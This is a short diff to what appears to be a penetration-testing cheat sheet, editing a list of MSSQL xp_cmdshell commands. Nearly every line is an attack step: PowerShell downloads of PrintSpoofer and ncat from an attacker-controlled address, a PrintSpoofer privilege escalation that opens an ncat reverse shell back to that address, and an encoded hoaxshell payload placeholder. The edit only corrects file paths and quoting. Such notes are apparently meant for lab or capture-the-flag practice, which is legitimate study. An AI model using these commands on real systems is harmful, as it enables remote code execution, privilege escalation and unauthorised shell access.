@@ -164,10 +164,10 @@ xp_cmdshell whoami
 xp_cmdshell whoami /priv
 xp_cmdshell "powershell iwr http://10.10.14.145:8000/PrintSpoofer64.exe -o c:\windows\temp\PrintSpoofer.exe";
 xp_cmdshell "powershell iwr http://10.10.14.145:8000/ncat.exe -o c:\windows\temp\ncat.exe";
-xp_cmdshell %Temp%\PrintSpoofer.exe -c "%TEMP%\ncat.exe 10.10.14.145 1337 -e cmd";
+xp_cmdshell c:\windows\temp\PrintSpoofer.exe -c "c:\windows\temp\ncat.exe 10.10.14.145 1337 -e cmd";
 xp_cmdshell "powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\ncat.exe";
 
-xp_cmdshell "powershell -e <hoaxshell payload>";
+xp_cmdshell powershell -e <hoaxshell payload>;
 
 
 ```
